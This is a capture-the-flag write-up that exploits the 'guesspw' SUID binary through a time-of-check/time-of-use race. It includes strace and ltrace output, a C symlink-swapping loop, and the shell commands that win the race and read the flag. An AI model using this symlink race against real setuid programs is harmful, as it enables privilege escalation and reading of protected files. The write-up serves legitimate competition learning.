### Solved by superkojiman, barrebas, Swappage

guesspw is a SUID guesspw binary that takes a file as an argument. The contents of this file is compared with /home/guesspw/password and if they're the same, it gives us a shell. Naturally we don't have read permissions on /home/guesspw/password so we'll need to find a different way to get a shell.

I recreated the environment on the challenge server and used strace and ltrace to give me an idea of what was going on: 

```
# strace ./guesspw wut

getcwd("/root/codegate/guesspw", 4096)  = 23
lstat64("/root/codegate/guesspw/wut", {st_mode=S_IFREG|0644, st_size=23, ...}) = 0
open("/home/guesspw/password", O_RDONLY) = 3
open("/root/codegate/guesspw/wut", O_RDONLY) = 4
read(4, "this is a test message\n", 128) = 23
read(3, "hello\n", 128)                 = 6
exit_group(0)                           = ?
```

Here we see that my input file wut's contents didn't match the contents of the password file so it quit. But if they're the same, then we get our shell:

```
open("/home/guesspw/password", O_RDONLY) = 3
open("/root/codegate/guesspw/wut", O_RDONLY) = 4
read(4, "hello\n", 128)                 = 6
read(3, "hello\n", 128)                 = 6
geteuid32()                             = 0
geteuid32()                             = 0
geteuid32()                             = 0
setresuid32(0, 0, 0)                    = 0
execve("/bin/sh", ["sh"], [/* 37 vars */]) = 0
```

Could we just providet the actual password file then since the binary is guesspw and can therefore read it? No, as it turns out the binary checks the file's name using strstr(). If it contains "password" or "flag", it exits:

```
# ltrace ./guesspw wut
__libc_start_main(0x8048620, 2, 0xff92a194, 0x80495d0, 0x8049640 <unfinished ...>
memset(0xff928e70, '\000', 128)                                                                               = 0xff928e70
memset(0xff928df0, '\000', 128)                                                                               = 0xff928df0
realpath(0xff92a5ea, 0xff928f10, 128, 0, 0)                                                                   = 0
strstr("/home/guesspw/wut", "password")                                                                       = NULL
strstr("/home/guesspw/wut", "flag")                                                                           = NULL
open("/home/guesspw/password", 0, 0200)                                                                       = 3
open("/home/guesspw/wut", 0, 0200)                                                                            = -1
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

Sure enough, if I used wut_password, it quits:

```
# ltrace ./guesspw wut_password_flag 
__libc_start_main(0x8048620, 2, 0xffcc9dc4, 0x80495d0, 0x8049640 <unfinished ...>
memset(0xffcc8aa0, '\000', 128)                                                                               = 0xffcc8aa0
memset(0xffcc8a20, '\000', 128)                                                                               = 0xffcc8a20
realpath(0xffcca5dc, 0xffcc8b40, 128, 0, 0)                                                                   = 0xffcc8b40
strstr("/home/guesspw/wut_password_flag", "password")                                                         = "password_flag"
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

The calls to strstr() occur before open(), which led us to wonder if we could trigger a race condition. If we create a symlink to say /etc/passwd, then strstr() would pass. Then right after that, quickly update the symlink to point to /home/guesspw/password before open() was called. I reused some old code I'd written to exploit a race condition in a previous boot2root. I created the following C file, /tmp/skoji/race.c

```c
int main(int argc, char *argv[]) {
    while (1) {
        symlink("/etc/passwd", "/tmp/skoji/foo"); 
        unlink("/tmp/skoji/foo"); 

        symlink("/home/guesspw/password", "/tmp/skoji/foo"); 
        unlink("/tmp/skoji/foo"); 
    }
    return 0;
}
```

This infinite loop symlinks /tmp/skoji/foo to /etc/passwd and then removes it and symlinks it to /home/guesspw/password.

Compile: 

```plain
gcc race.c -o race
```

Now we run it and set a nice value to give it higher priority over guesspw: 

```
user@cg2015-1:/tmp/skoji$ nice -n 1 ./race
```

In another terminal, run guesspw. After several minutes we should win the race: 

```
user@cg2015-1:/home/guesspw$ while :; do ./guesspw /tmp/skoji/foo ; doneuser@\h:\w$         
user@\h:\w$ 
user@\h:\w$ id
uid=1003(guesspw) gid=1366(user1366) groups=1366(user1366)
user@\h:\w$ ls
flag  guesspw  password
user@\h:\w$ cat flag
cheapestflagever
```

The flag is ***cheapestflagever***
